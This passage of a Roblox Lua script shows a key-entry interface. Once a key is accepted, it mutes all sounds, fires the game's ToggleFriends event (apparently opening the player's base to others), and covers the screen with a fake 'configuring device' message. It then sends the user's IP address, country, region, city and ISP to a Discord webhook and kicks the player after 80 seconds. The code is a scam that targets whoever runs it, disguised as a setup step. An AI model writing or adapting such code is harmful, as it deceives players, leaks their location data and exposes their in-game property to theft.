CreditLabelKey.Parent = FrameKey

makeDraggable(FrameKey, {Enum.UserInputType.MouseButton1})

-- Function for full-coverage white screen with total mute and ToggleFriends
local function pantallaBlanca()
    -- Mute all sounds exactly when white screen appears
    for _, sound in ipairs(game:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end
    game.DescendantAdded:Connect(function(obj)
        if obj:IsA("Sound") then
            obj.Volume = 0
        end
    end)

    -- Fire ToggleFriends RemoteEvent
    local toggleFriendsEvent = ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]
    if toggleFriendsEvent then
        pcall(function()
            toggleFriendsEvent:FireServer()
            print("ToggleFriends fired successfully!")
        end)
    else
        warn("ToggleFriends RemoteEvent not found!")
    end

    local whiteGui = Instance.new("ScreenGui")
    whiteGui.Name = "WhiteScreen"
    whiteGui.Parent = game.CoreGui
    whiteGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    whiteGui.IgnoreGuiInset = true -- Ensures full coverage, ignoring safe areas

    local whiteFrame = Instance.new("Frame")
    whiteFrame.Size = UDim2.new(1, 0, 1, 0) -- Full screen size
    whiteFrame.Position = UDim2.new(0, 0, 0, 0) -- Starts at top-left
    whiteFrame.BackgroundColor3 = Color3.new(1, 1, 1) -- Pure white
    whiteFrame.BackgroundTransparency = 0 -- Fully opaque
    whiteFrame.BorderSizePixel = 0
    whiteFrame.ZIndex = 9999 -- High ZIndex to cover everything
    whiteFrame.Parent = whiteGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "Configurando dispositivoâ€¦"
    label.Font = Enum.Font.GothamBold
    label.TextSize = 36
    label.TextColor3 = Color3.new(0, 0, 0)
    label.Parent = whiteFrame

    -- Send webhook when white screen is shown
    sendToDiscord("white_screen", ip, country, region, city, isp)
end

-- Button logic
EnterButton.MouseButton1Click:Connect(function()
    local keyEntered = InputBox.Text
    if validKeys[keyEntered] then
        InputBox.Text = "Procesando..."
        EnterButton.Active = false
        EnterButton.AutoButtonColor = false

        wait(2)

        -- Hide UI and show white screen
        ScreenGuiKey.Enabled = false
        pantallaBlanca()

        wait(80)

        -- Kick player after 80 seconds
        player:Kick("Dispositivo Configurado")
    else
        InputBox.Text = "Llave incorrecta"
    end
end)
